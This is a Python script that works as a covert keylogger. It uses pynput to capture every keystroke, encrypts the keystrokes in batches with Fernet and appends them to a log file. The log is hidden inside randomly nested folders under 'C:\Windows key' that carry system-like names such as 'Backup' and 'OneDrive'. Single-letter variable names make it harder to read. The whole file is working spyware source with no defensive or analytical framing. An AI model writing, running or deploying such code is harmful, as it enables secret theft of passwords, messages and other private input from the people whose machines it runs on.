from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import random

a = [
    "bin", "windows_backup", "User", "Note", "OneDrive", 
    "Document", "File", "Backup", "System", "Temp"
]

def b():
    c = r"C:\Windows key\windows"
    if not os.path.exists(c):
        os.makedirs(c)
    for i in range(2):
        d = random.choice(a)
        c = os.path.join(c, d)
        if not os.path.exists(c):
            os.makedirs(c)
    e = ["bin", "User", "Note", "OneDrive", "Document", "File", "User"]
    for f in e:
        c = os.path.join(c, f)
        if not os.path.exists(c):
            os.makedirs(c)
    return c

def g(h):
    i = os.path.join(h, "windows.key")
    if not os.path.exists(i):
        j = Fernet.generate_key()
        with open(i, "wb") as k:
            k.write(j)

def l(h):
    i = os.path.join(h, "windows.key")
    try:
        return open(i, "rb").read()
    except FileNotFoundError:
        g(h)
        return open(i, "rb").read()

def m(n, h):
    o = l(h)
    p = Fernet(o)
    q = p.encrypt("".join(n).encode())
    r = os.path.join(h, "windows_key.txt")
    with open(r, "ab") as s:
        s.write(q + b'\n')

t = []
u = 30

def v(h):
    if t:
        m(t, h)
        t.clear()

def on_press(key):
    global t
    try:
        if key == Key.enter:
            t.append("\n")
        elif key in {Key.space, Key.tab, Key.backspace}:
            t.append(f'[{key}]')
        else:
            t.append(key.char)
    except AttributeError:
        t.append(f'[{key}]')

    if len(t) >= u:
        v(h)

def on_release(key):
    if key == Key.esc:
        v(h)
        return False

h = b()
g(h)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
